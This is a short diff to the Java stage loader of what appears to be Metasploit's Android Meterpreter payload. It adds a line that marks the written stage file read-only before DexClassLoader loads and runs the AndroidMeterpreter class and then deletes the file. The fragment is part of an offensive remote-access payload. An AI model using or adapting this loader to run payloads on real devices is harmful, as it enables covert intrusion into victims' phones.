@@ -42,6 +42,7 @@ public class Meterpreter {
         fop.close();
 
         // Load the stage
+        file.setReadOnly();
         DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Meterpreter.class.getClassLoader());
         Class<?> myClass = classLoader.loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
         file.delete();
